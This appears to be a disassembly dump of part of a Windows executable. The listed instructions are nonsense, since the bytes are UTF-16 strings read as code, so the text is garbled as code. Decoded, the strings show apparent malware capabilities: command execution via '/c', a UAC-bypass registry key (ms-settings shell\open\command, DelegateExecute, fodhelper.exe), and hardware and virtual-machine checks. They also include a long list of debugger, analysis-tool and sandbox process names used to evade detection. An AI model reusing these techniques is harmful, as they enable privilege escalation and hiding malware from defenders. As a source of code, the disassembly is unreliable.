  409be7:	15 74 00 65 00       	adc    $0x650074,%eax
  409bec:	78 00                	js     0x409bee
  409bee:	74 00                	je     0x409bf0
  409bf0:	2f                   	das
  409bf1:	00 70 00             	add    %dh,0x0(%eax)
  409bf4:	6c                   	insb   (%dx),%es:(%edi)
  409bf5:	00 61 00             	add    %ah,0x0(%ecx)
  409bf8:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  409bfe:	2f                   	das
  409bff:	00 63 00             	add    %ah,0x0(%ebx)
  409c02:	20 00                	and    %al,(%eax)
  409c04:	00 33                	add    %dh,(%ebx)
  409c06:	45                   	inc    %ebp
  409c07:	00 72 00             	add    %dh,0x0(%edx)
  409c0a:	72 00                	jb     0x409c0c
  409c0c:	6f                   	outsl  %ds:(%esi),(%dx)
  409c0d:	00 72 00             	add    %dh,0x0(%edx)
  409c10:	20 00                	and    %al,(%eax)
  409c12:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  409c16:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  409c1a:	75 00                	jne    0x409c1c
  409c1c:	74 00                	je     0x409c1e
  409c1e:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  409c24:	20 00                	and    %al,(%eax)
  409c26:	63 00                	arpl   %eax,(%eax)
  409c28:	6f                   	outsl  %ds:(%esi),(%dx)
  409c29:	00 6d 00             	add    %ch,0x0(%ebp)
  409c2c:	6d                   	insl   (%dx),%es:(%edi)
  409c2d:	00 61 00             	add    %ah,0x0(%ecx)
  409c30:	6e                   	outsb  %ds:(%esi),(%dx)
  409c31:	00 64 00 3a          	add    %ah,0x3a(%eax,%eax,1)
  409c35:	00 20                	add    %ah,(%eax)
  409c37:	00 00                	add    %al,(%eax)
  409c39:	5f                   	pop    %edi
  409c3a:	53                   	push   %ebx
  409c3b:	00 6f 00             	add    %ch,0x0(%edi)
  409c3e:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  409c43:	00 61 00             	add    %ah,0x0(%ecx)
  409c46:	72 00                	jb     0x409c48
  409c48:	65 00 5c 00 43       	add    %bl,%gs:0x43(%eax,%eax,1)
  409c4d:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  409c51:	00 73 00             	add    %dh,0x0(%ebx)
  409c54:	73 00                	jae    0x409c56
  409c56:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409c5a:	5c                   	pop    %esp
  409c5b:	00 6d 00             	add    %ch,0x0(%ebp)
  409c5e:	73 00                	jae    0x409c60
  409c60:	2d 00 73 00 65       	sub    $0x65007300,%eax
  409c65:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  409c69:	00 69 00             	add    %ch,0x0(%ecx)
  409c6c:	6e                   	outsb  %ds:(%esi),(%dx)
  409c6d:	00 67 00             	add    %ah,0x0(%edi)
  409c70:	73 00                	jae    0x409c72
  409c72:	5c                   	pop    %esp
  409c73:	00 73 00             	add    %dh,0x0(%ebx)
  409c76:	68 00 65 00 6c       	push   $0x6c006500
  409c7b:	00 6c 00 5c          	add    %ch,0x5c(%eax,%eax,1)
  409c7f:	00 6f 00             	add    %ch,0x0(%edi)
  409c82:	70 00                	jo     0x409c84
  409c84:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409c88:	5c                   	pop    %esp
  409c89:	00 63 00             	add    %ah,0x0(%ebx)
  409c8c:	6f                   	outsl  %ds:(%esi),(%dx)
  409c8d:	00 6d 00             	add    %ch,0x0(%ebp)
  409c90:	6d                   	insl   (%dx),%es:(%edi)
  409c91:	00 61 00             	add    %ah,0x0(%ecx)
  409c94:	6e                   	outsb  %ds:(%esi),(%dx)
  409c95:	00 64 00 01          	add    %ah,0x1(%eax,%eax,1)
  409c99:	1f                   	pop    %ds
  409c9a:	44                   	inc    %esp
  409c9b:	00 65 00             	add    %ah,0x0(%ebp)
  409c9e:	6c                   	insb   (%dx),%es:(%edi)
  409c9f:	00 65 00             	add    %ah,0x0(%ebp)
  409ca2:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  409ca6:	74 00                	je     0x409ca8
  409ca8:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  409cac:	78 00                	js     0x409cae
  409cae:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  409cb2:	75 00                	jne    0x409cb4
  409cb4:	74 00                	je     0x409cb6
  409cb6:	65 00 00             	add    %al,%gs:(%eax)
  409cb9:	1b 66 00             	sbb    0x0(%esi),%esp
  409cbc:	6f                   	outsl  %ds:(%esi),(%dx)
  409cbd:	00 64 00 68          	add    %ah,0x68(%eax,%eax,1)
  409cc1:	00 65 00             	add    %ah,0x0(%ebp)
  409cc4:	6c                   	insb   (%dx),%es:(%edi)
  409cc5:	00 70 00             	add    %dh,0x0(%eax)
  409cc8:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409ccc:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  409cd0:	78 00                	js     0x409cd2
  409cd2:	65 00 00             	add    %al,%gs:(%eax)
  409cd5:	45                   	inc    %ebp
  409cd6:	53                   	push   %ebx
  409cd7:	00 65 00             	add    %ah,0x0(%ebp)
  409cda:	6c                   	insb   (%dx),%es:(%edi)
  409cdb:	00 65 00             	add    %ah,0x0(%ebp)
  409cde:	63 00                	arpl   %eax,(%eax)
  409ce0:	74 00                	je     0x409ce2
  409ce2:	20 00                	and    %al,(%eax)
  409ce4:	2a 00                	sub    (%eax),%al
  409ce6:	20 00                	and    %al,(%eax)
  409ce8:	66 00 72 00          	data16 add %dh,0x0(%edx)
  409cec:	6f                   	outsl  %ds:(%esi),(%dx)
  409ced:	00 6d 00             	add    %ch,0x0(%ebp)
  409cf0:	20 00                	and    %al,(%eax)
  409cf2:	57                   	push   %edi
  409cf3:	00 69 00             	add    %ch,0x0(%ecx)
  409cf6:	6e                   	outsb  %ds:(%esi),(%dx)
  409cf7:	00 33                	add    %dh,(%ebx)
  409cf9:	00 32                	add    %dh,(%edx)
  409cfb:	00 5f 00             	add    %bl,0x0(%edi)
  409cfe:	43                   	inc    %ebx
  409cff:	00 6f 00             	add    %ch,0x0(%edi)
  409d02:	6d                   	insl   (%dx),%es:(%edi)
  409d03:	00 70 00             	add    %dh,0x0(%eax)
  409d06:	75 00                	jne    0x409d08
  409d08:	74 00                	je     0x409d0a
  409d0a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409d0e:	53                   	push   %ebx
  409d0f:	00 79 00             	add    %bh,0x0(%ecx)
  409d12:	73 00                	jae    0x409d14
  409d14:	74 00                	je     0x409d16
  409d16:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409d1a:	00 19                	add    %bl,(%ecx)
  409d1c:	4d                   	dec    %ebp
  409d1d:	00 61 00             	add    %ah,0x0(%ecx)
  409d20:	6e                   	outsb  %ds:(%esi),(%dx)
  409d21:	00 75 00             	add    %dh,0x0(%ebp)
  409d24:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  409d28:	63 00                	arpl   %eax,(%eax)
  409d2a:	74 00                	je     0x409d2c
  409d2c:	75 00                	jne    0x409d2e
  409d2e:	72 00                	jb     0x409d30
  409d30:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409d34:	00 0b                	add    %cl,(%ebx)
  409d36:	4d                   	dec    %ebp
  409d37:	00 6f 00             	add    %ch,0x0(%edi)
  409d3a:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  409d3e:	6c                   	insb   (%dx),%es:(%edi)
  409d3f:	00 00                	add    %al,(%eax)
  409d41:	80 87 53 00 59 00 53 	addb   $0x53,0x590053(%edi)
  409d48:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  409d4c:	00 4d 00             	add    %cl,0x0(%ebp)
  409d4f:	5c                   	pop    %esp
  409d50:	00 43 00             	add    %al,0x0(%ebx)
  409d53:	75 00                	jne    0x409d55
  409d55:	72 00                	jb     0x409d57
  409d57:	72 00                	jb     0x409d59
  409d59:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409d5d:	74 00                	je     0x409d5f
  409d5f:	43                   	inc    %ebx
  409d60:	00 6f 00             	add    %ch,0x0(%edi)
  409d63:	6e                   	outsb  %ds:(%esi),(%dx)
  409d64:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  409d68:	00 6f 00             	add    %ch,0x0(%edi)
  409d6b:	6c                   	insb   (%dx),%es:(%edi)
  409d6c:	00 53 00             	add    %dl,0x0(%ebx)
  409d6f:	65 00 74 00 5c       	add    %dh,%gs:0x5c(%eax,%eax,1)
  409d74:	00 43 00             	add    %al,0x0(%ebx)
  409d77:	6f                   	outsl  %ds:(%esi),(%dx)
  409d78:	00 6e 00             	add    %ch,0x0(%esi)
  409d7b:	74 00                	je     0x409d7d
  409d7d:	72 00                	jb     0x409d7f
  409d7f:	6f                   	outsl  %ds:(%esi),(%dx)
  409d80:	00 6c 00 5c          	add    %ch,0x5c(%eax,%eax,1)
  409d84:	00 53 00             	add    %dl,0x0(%ebx)
  409d87:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409d8b:	73 00                	jae    0x409d8d
  409d8d:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409d93:	20 00                	and    %al,(%eax)
  409d95:	4d                   	dec    %ebp
  409d96:	00 61 00             	add    %ah,0x0(%ecx)
  409d99:	6e                   	outsb  %ds:(%esi),(%dx)
  409d9a:	00 61 00             	add    %ah,0x0(%ecx)
  409d9d:	67 00 65 00          	add    %ah,0x0(%di)
  409da1:	72 00                	jb     0x409da3
  409da3:	5c                   	pop    %esp
  409da4:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  409da8:	00 62 00             	add    %ah,0x0(%edx)
  409dab:	75 00                	jne    0x409dad
  409dad:	67 00 20             	add    %ah,(%bx,%si)
  409db0:	00 50 00             	add    %dl,0x0(%eax)
  409db3:	72 00                	jb     0x409db5
  409db5:	69 00 6e 00 74 00    	imul   $0x74006e,(%eax),%eax
  409dbb:	20 00                	and    %al,(%eax)
  409dbd:	46                   	inc    %esi
  409dbe:	00 69 00             	add    %ch,0x0(%ecx)
  409dc1:	6c                   	insb   (%dx),%es:(%edi)
  409dc2:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  409dc6:	00 72 00             	add    %dh,0x0(%edx)
  409dc9:	00 0f                	add    %cl,(%edi)
  409dcb:	44                   	inc    %esp
  409dcc:	00 65 00             	add    %ah,0x0(%ebp)
  409dcf:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  409dd3:	75 00                	jne    0x409dd5
  409dd5:	6c                   	insb   (%dx),%es:(%edi)
  409dd6:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  409dda:	03 3a                	add    (%edx),%edi
  409ddc:	00 00                	add    %al,(%eax)
  409dde:	3b 53 00             	cmp    0x0(%ebx),%edx
  409de1:	65 00 6c 00 65       	add    %ch,%gs:0x65(%eax,%eax,1)
  409de6:	00 63 00             	add    %ah,0x0(%ebx)
  409de9:	74 00                	je     0x409deb
  409deb:	20 00                	and    %al,(%eax)
  409ded:	2a 00                	sub    (%eax),%al
  409def:	20 00                	and    %al,(%eax)
  409df1:	66 00 72 00          	data16 add %dh,0x0(%edx)
  409df5:	6f                   	outsl  %ds:(%esi),(%dx)
  409df6:	00 6d 00             	add    %ch,0x0(%ebp)
  409df9:	20 00                	and    %al,(%eax)
  409dfb:	57                   	push   %edi
  409dfc:	00 69 00             	add    %ch,0x0(%ecx)
  409dff:	6e                   	outsb  %ds:(%esi),(%dx)
  409e00:	00 33                	add    %dh,(%ebx)
  409e02:	00 32                	add    %dh,(%edx)
  409e04:	00 5f 00             	add    %bl,0x0(%edi)
  409e07:	50                   	push   %eax
  409e08:	00 6e 00             	add    %ch,0x0(%esi)
  409e0b:	50                   	push   %eax
  409e0c:	00 45 00             	add    %al,0x0(%ebp)
  409e0f:	6e                   	outsb  %ds:(%esi),(%dx)
  409e10:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  409e14:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  409e18:	00 00                	add    %al,(%eax)
  409e1a:	17                   	pop    %ss
  409e1b:	44                   	inc    %esp
  409e1c:	00 65 00             	add    %ah,0x0(%ebp)
  409e1f:	73 00                	jae    0x409e21
  409e21:	63 00                	arpl   %eax,(%eax)
  409e23:	72 00                	jb     0x409e25
  409e25:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  409e2b:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409e31:	00 0f                	add    %cl,(%edi)
  409e33:	76 00                	jbe    0x409e35
  409e35:	69 00 72 00 74 00    	imul   $0x740072,(%eax),%eax
  409e3b:	75 00                	jne    0x409e3d
  409e3d:	61                   	popa
  409e3e:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  409e42:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  409e47:	77 00                	ja     0x409e49
  409e49:	61                   	popa
  409e4a:	00 72 00             	add    %dh,0x0(%edx)
  409e4d:	65 00 00             	add    %al,%gs:(%eax)
  409e50:	09 76 00             	or     %esi,0x0(%esi)
  409e53:	62 00                	bound  %eax,(%eax)
  409e55:	6f                   	outsl  %ds:(%esi),(%dx)
  409e56:	00 78 00             	add    %bh,0x0(%eax)
  409e59:	00 0f                	add    %cl,(%edi)
  409e5b:	68 00 79 00 70       	push   $0x70007900
  409e60:	00 65 00             	add    %ah,0x0(%ebp)
  409e63:	72 00                	jb     0x409e65
  409e65:	2d 00 76 00 01       	sub    $0x1007600,%eax
  409e6a:	09 71 00             	or     %esi,0x0(%ecx)
  409e6d:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409e71:	75 00                	jne    0x409e73
  409e73:	00 69 53             	add    %ch,0x53(%ecx)
  409e76:	00 65 00             	add    %ah,0x0(%ebp)
  409e79:	6c                   	insb   (%dx),%es:(%edi)
  409e7a:	00 65 00             	add    %ah,0x0(%ebp)
  409e7d:	63 00                	arpl   %eax,(%eax)
  409e7f:	74 00                	je     0x409e81
  409e81:	20 00                	and    %al,(%eax)
  409e83:	54                   	push   %esp
  409e84:	00 6f 00             	add    %ch,0x0(%edi)
  409e87:	74 00                	je     0x409e89
  409e89:	61                   	popa
  409e8a:	00 6c 00 50          	add    %ch,0x50(%eax,%eax,1)
  409e8e:	00 68 00             	add    %ch,0x0(%eax)
  409e91:	79 00                	jns    0x409e93
  409e93:	73 00                	jae    0x409e95
  409e95:	69 00 63 00 61 00    	imul   $0x610063,(%eax),%eax
  409e9b:	6c                   	insb   (%dx),%es:(%edi)
  409e9c:	00 4d 00             	add    %cl,0x0(%ebp)
  409e9f:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409ea3:	6f                   	outsl  %ds:(%esi),(%dx)
  409ea4:	00 72 00             	add    %dh,0x0(%edx)
  409ea7:	79 00                	jns    0x409ea9
  409ea9:	20 00                	and    %al,(%eax)
  409eab:	66 00 72 00          	data16 add %dh,0x0(%edx)
  409eaf:	6f                   	outsl  %ds:(%esi),(%dx)
  409eb0:	00 6d 00             	add    %ch,0x0(%ebp)
  409eb3:	20 00                	and    %al,(%eax)
  409eb5:	57                   	push   %edi
  409eb6:	00 69 00             	add    %ch,0x0(%ecx)
  409eb9:	6e                   	outsb  %ds:(%esi),(%dx)
  409eba:	00 33                	add    %dh,(%ebx)
  409ebc:	00 32                	add    %dh,(%edx)
  409ebe:	00 5f 00             	add    %bl,0x0(%edi)
  409ec1:	43                   	inc    %ebx
  409ec2:	00 6f 00             	add    %ch,0x0(%edi)
  409ec5:	6d                   	insl   (%dx),%es:(%edi)
  409ec6:	00 70 00             	add    %dh,0x0(%eax)
  409ec9:	75 00                	jne    0x409ecb
  409ecb:	74 00                	je     0x409ecd
  409ecd:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409ed1:	53                   	push   %ebx
  409ed2:	00 79 00             	add    %bh,0x0(%ecx)
  409ed5:	73 00                	jae    0x409ed7
  409ed7:	74 00                	je     0x409ed9
  409ed9:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409edd:	00 27                	add    %ah,(%edi)
  409edf:	54                   	push   %esp
  409ee0:	00 6f 00             	add    %ch,0x0(%edi)
  409ee3:	74 00                	je     0x409ee5
  409ee5:	61                   	popa
  409ee6:	00 6c 00 50          	add    %ch,0x50(%eax,%eax,1)
  409eea:	00 68 00             	add    %ch,0x0(%eax)
  409eed:	79 00                	jns    0x409eef
  409eef:	73 00                	jae    0x409ef1
  409ef1:	69 00 63 00 61 00    	imul   $0x610063,(%eax),%eax
  409ef7:	6c                   	insb   (%dx),%es:(%edi)
  409ef8:	00 4d 00             	add    %cl,0x0(%ebp)
  409efb:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409eff:	6f                   	outsl  %ds:(%esi),(%dx)
  409f00:	00 72 00             	add    %dh,0x0(%edx)
  409f03:	79 00                	jns    0x409f05
  409f05:	00 67 53             	add    %ah,0x53(%edi)
  409f08:	00 65 00             	add    %ah,0x0(%ebp)
  409f0b:	6c                   	insb   (%dx),%es:(%edi)
  409f0c:	00 65 00             	add    %ah,0x0(%ebp)
  409f0f:	63 00                	arpl   %eax,(%eax)
  409f11:	74 00                	je     0x409f13
  409f13:	20 00                	and    %al,(%eax)
  409f15:	4e                   	dec    %esi
  409f16:	00 75 00             	add    %dh,0x0(%ebp)
  409f19:	6d                   	insl   (%dx),%es:(%edi)
  409f1a:	00 62 00             	add    %ah,0x0(%edx)
  409f1d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409f21:	4f                   	dec    %edi
  409f22:	00 66 00             	add    %ah,0x0(%esi)
  409f25:	50                   	push   %eax
  409f26:	00 72 00             	add    %dh,0x0(%edx)
  409f29:	6f                   	outsl  %ds:(%esi),(%dx)
  409f2a:	00 63 00             	add    %ah,0x0(%ebx)
  409f2d:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409f31:	73 00                	jae    0x409f33
  409f33:	6f                   	outsl  %ds:(%esi),(%dx)
  409f34:	00 72 00             	add    %dh,0x0(%edx)
  409f37:	73 00                	jae    0x409f39
  409f39:	20 00                	and    %al,(%eax)
  409f3b:	66 00 72 00          	data16 add %dh,0x0(%edx)
  409f3f:	6f                   	outsl  %ds:(%esi),(%dx)
  409f40:	00 6d 00             	add    %ch,0x0(%ebp)
  409f43:	20 00                	and    %al,(%eax)
  409f45:	57                   	push   %edi
  409f46:	00 69 00             	add    %ch,0x0(%ecx)
  409f49:	6e                   	outsb  %ds:(%esi),(%dx)
  409f4a:	00 33                	add    %dh,(%ebx)
  409f4c:	00 32                	add    %dh,(%edx)
  409f4e:	00 5f 00             	add    %bl,0x0(%edi)
  409f51:	43                   	inc    %ebx
  409f52:	00 6f 00             	add    %ch,0x0(%edi)
  409f55:	6d                   	insl   (%dx),%es:(%edi)
  409f56:	00 70 00             	add    %dh,0x0(%eax)
  409f59:	75 00                	jne    0x409f5b
  409f5b:	74 00                	je     0x409f5d
  409f5d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409f61:	53                   	push   %ebx
  409f62:	00 79 00             	add    %bh,0x0(%ecx)
  409f65:	73 00                	jae    0x409f67
  409f67:	74 00                	je     0x409f69
  409f69:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409f6d:	00 25 4e 00 75 00    	add    %ah,0x75004e
  409f73:	6d                   	insl   (%dx),%es:(%edi)
  409f74:	00 62 00             	add    %ah,0x0(%edx)
  409f77:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409f7b:	4f                   	dec    %edi
  409f7c:	00 66 00             	add    %ah,0x0(%esi)
  409f7f:	50                   	push   %eax
  409f80:	00 72 00             	add    %dh,0x0(%edx)
  409f83:	6f                   	outsl  %ds:(%esi),(%dx)
  409f84:	00 63 00             	add    %ah,0x0(%ebx)
  409f87:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409f8b:	73 00                	jae    0x409f8d
  409f8d:	6f                   	outsl  %ds:(%esi),(%dx)
  409f8e:	00 72 00             	add    %dh,0x0(%edx)
  409f91:	73 00                	jae    0x409f93
  409f93:	00 0f                	add    %cl,(%edi)
  409f95:	6f                   	outsl  %ds:(%esi),(%dx)
  409f96:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  409f9a:	00 79 00             	add    %bh,0x0(%ecx)
  409f9d:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  409fa1:	67 00 00             	add    %al,(%bx,%si)
  409fa4:	0b 69 00             	or     0x0(%ecx),%ebp
  409fa7:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409fab:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  409faf:	00 07                	add    %al,(%edi)
  409fb1:	69 00 64 00 61 00    	imul   $0x610064,(%eax),%eax
  409fb7:	00 09                	add    %cl,(%ecx)
  409fb9:	69 00 64 00 61 00    	imul   $0x610064,(%eax),%eax
  409fbf:	67 00 00             	add    %al,(%bx,%si)
  409fc2:	09 69 00             	or     %ebp,0x0(%ecx)
  409fc5:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409fc9:	77 00                	ja     0x409fcb
  409fcb:	00 0d 69 00 64 00    	add    %cl,0x640069
  409fd1:	61                   	popa
  409fd2:	00 77 00             	add    %dh,0x0(%edi)
  409fd5:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  409fd9:	00 09                	add    %cl,(%ecx)
  409fdb:	69 00 64 00 61 00    	imul   $0x610064,(%eax),%eax
  409fe1:	71 00                	jno    0x409fe3
  409fe3:	00 0d 69 00 64 00    	add    %cl,0x640069
  409fe9:	61                   	popa
  409fea:	00 71 00             	add    %dh,0x0(%ecx)
  409fed:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  409ff1:	00 13                	add    %dl,(%ebx)
  409ff3:	77 00                	ja     0x409ff5
  409ff5:	69 00 72 00 65 00    	imul   $0x650072,(%eax),%eax
  409ffb:	73 00                	jae    0x409ffd
  409ffd:	68 00 61 00 72       	push   $0x72006100
  40a002:	00 6b 00             	add    %ch,0x0(%ebx)
  40a005:	00 0f                	add    %cl,(%edi)
  40a007:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40a00b:	64 00 64 00 6c       	add    %ah,%fs:0x6c(%eax,%eax,1)
  40a010:	00 65 00             	add    %ah,0x0(%ebp)
  40a013:	72 00                	jb     0x40a015
  40a015:	00 0d 78 00 36 00    	add    %cl,0x360078
  40a01b:	34 00                	xor    $0x0,%al
  40a01d:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40a021:	67 00 00             	add    %al,(%bx,%si)
  40a024:	0d 78 00 33 00       	or     $0x330078,%eax
  40a029:	32 00                	xor    (%eax),%al
  40a02b:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40a02f:	67 00 00             	add    %al,(%bx,%si)
  40a032:	11 64 00 65          	adc    %esp,0x65(%eax,%eax,1)
  40a036:	00 62 00             	add    %ah,0x0(%edx)
  40a039:	75 00                	jne    0x40a03b
  40a03b:	67 00 67 00          	add    %ah,0x0(%bx)
  40a03f:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a043:	00 0f                	add    %cl,(%edi)
  40a045:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40a049:	67 00 76 00          	add    %dh,0x0(%bp)
  40a04d:	69 00 65 00 77 00    	imul   $0x770065,(%eax),%eax
  40a053:	00 1b                	add    %bl,(%ebx)
  40a055:	70 00                	jo     0x40a057
  40a057:	72 00                	jb     0x40a059
  40a059:	6f                   	outsl  %ds:(%esi),(%dx)
  40a05a:	00 63 00             	add    %ah,0x0(%ebx)
  40a05d:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a061:	73 00                	jae    0x40a063
  40a063:	68 00 61 00 63       	push   $0x63006100
  40a068:	00 6b 00             	add    %ch,0x0(%ebx)
  40a06b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a06f:	00 0f                	add    %cl,(%edi)
  40a071:	70 00                	jo     0x40a073
  40a073:	72 00                	jb     0x40a075
  40a075:	6f                   	outsl  %ds:(%esi),(%dx)
  40a076:	00 63 00             	add    %ah,0x0(%ebx)
  40a079:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40a07d:	70 00                	jo     0x40a07f
  40a07f:	00 0f                	add    %cl,(%edi)
  40a081:	70 00                	jo     0x40a083
  40a083:	72 00                	jb     0x40a085
  40a085:	6f                   	outsl  %ds:(%esi),(%dx)
  40a086:	00 63 00             	add    %ah,0x0(%ebx)
  40a089:	6d                   	insl   (%dx),%es:(%edi)
  40a08a:	00 6f 00             	add    %ch,0x0(%edi)
  40a08d:	6e                   	outsb  %ds:(%esi),(%dx)
  40a08e:	00 00                	add    %al,(%eax)
  40a090:	0d 64 00 65 00       	or     $0x650064,%eax
  40a095:	76 00                	jbe    0x40a097
  40a097:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40a09b:	76 00                	jbe    0x40a09d
  40a09d:	00 07                	add    %al,(%edi)
  40a09f:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40a0a3:	67 00 00             	add    %al,(%bx,%si)
  40a0a6:	21 69 00             	and    %ebp,0x0(%ecx)
  40a0a9:	6d                   	insl   (%dx),%es:(%edi)
  40a0aa:	00 6d 00             	add    %ch,0x0(%ebp)
  40a0ad:	75 00                	jne    0x40a0af
  40a0af:	6e                   	outsb  %ds:(%esi),(%dx)
  40a0b0:	00 69 00             	add    %ch,0x0(%ecx)
  40a0b3:	74 00                	je     0x40a0b5
  40a0b5:	79 00                	jns    0x40a0b7
  40a0b7:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40a0bb:	62 00                	bound  %eax,(%eax)
  40a0bd:	75 00                	jne    0x40a0bf
  40a0bf:	67 00 67 00          	add    %ah,0x0(%bx)
  40a0c3:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a0c7:	00 0f                	add    %cl,(%edi)
  40a0c9:	53                   	push   %ebx
  40a0ca:	00 62 00             	add    %ah,0x0(%edx)
  40a0cd:	69 00 65 00 53 00    	imul   $0x530065,(%eax),%eax
  40a0d3:	76 00                	jbe    0x40a0d5
  40a0d5:	63 00                	arpl   %eax,(%eax)
  40a0d7:	00 17                	add    %dl,(%edi)
  40a0d9:	56                   	push   %esi
  40a0da:	00 42 00             	add    %al,0x0(%edx)
  40a0dd:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0de:	00 78 00             	add    %bh,0x0(%eax)
  40a0e1:	53                   	push   %ebx
  40a0e2:	00 65 00             	add    %ah,0x0(%ebp)
  40a0e5:	72 00                	jb     0x40a0e7
  40a0e7:	76 00                	jbe    0x40a0e9
  40a0e9:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  40a0ef:	00 11                	add    %dl,(%ecx)
  40a0f1:	76 00                	jbe    0x40a0f3
  40a0f3:	6d                   	insl   (%dx),%es:(%edi)
  40a0f4:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40a0f8:	00 6f 00             	add    %ch,0x0(%edi)
  40a0fb:	6c                   	insb   (%dx),%es:(%edi)
  40a0fc:	00 73 00             	add    %dh,0x0(%ebx)
  40a0ff:	64 00 00             	add    %al,%fs:(%eax)
  40a102:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40a107:	73 00                	jae    0x40a109
  40a109:	72 00                	jb     0x40a10b
  40a10b:	76 00                	jbe    0x40a10d
  40a10d:	63 00                	arpl   %eax,(%eax)
  40a10f:	00 15 78 00 65 00    	add    %dl,0x650078
  40a115:	6e                   	outsb  %ds:(%esi),(%dx)
  40a116:	00 73 00             	add    %dh,0x0(%ebx)
  40a119:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a11d:	76 00                	jbe    0x40a11f
  40a11f:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  40a125:	00 0f                	add    %cl,(%edi)
  40a127:	64 00 66 00          	add    %ah,%fs:0x0(%esi)
  40a12b:	35 00 73 00 65       	xor    $0x65007300,%eax
  40a130:	00 72 00             	add    %dh,0x0(%edx)
  40a133:	76 00                	jbe    0x40a135
  40a135:	00 0d 70 00 72 00    	add    %cl,0x720070
  40a13b:	6c                   	insb   (%dx),%es:(%edi)
  40a13c:	00 5f 00             	add    %bl,0x0(%edi)
  40a13f:	63 00                	arpl   %eax,(%eax)
  40a141:	63 00                	arpl   %eax,(%eax)
  40a143:	00 13                	add    %dl,(%ebx)
  40a145:	70 00                	jo     0x40a147
  40a147:	72 00                	jb     0x40a149
  40a149:	6c                   	insb   (%dx),%es:(%edi)
  40a14a:	00 5f 00             	add    %bl,0x0(%edi)
  40a14d:	74 00                	je     0x40a14f
  40a14f:	6f                   	outsl  %ds:(%esi),(%dx)
  40a150:	00 6f 00             	add    %ch,0x0(%edi)
  40a153:	6c                   	insb   (%dx),%es:(%edi)
  40a154:	00 73 00             	add    %dh,0x0(%ebx)
  40a157:	00 2b                	add    %ch,(%ebx)
  40a159:	6d                   	insl   (%dx),%es:(%edi)
  40a15a:	00 69 00             	add    %ch,0x0(%ecx)
  40a15d:	63 00                	arpl   %eax,(%eax)
  40a15f:	72 00                	jb     0x40a161
  40a161:	6f                   	outsl  %ds:(%esi),(%dx)
  40a162:	00 73 00             	add    %dh,0x0(%ebx)
  40a165:	6f                   	outsl  %ds:(%esi),(%dx)
  40a166:	00 66 00             	add    %ah,0x0(%esi)
  40a169:	74 00                	je     0x40a16b
  40a16b:	20 00                	and    %al,(%eax)
  40a16d:	63 00                	arpl   %eax,(%eax)
  40a16f:	6f                   	outsl  %ds:(%esi),(%dx)
  40a170:	00 72 00             	add    %dh,0x0(%edx)
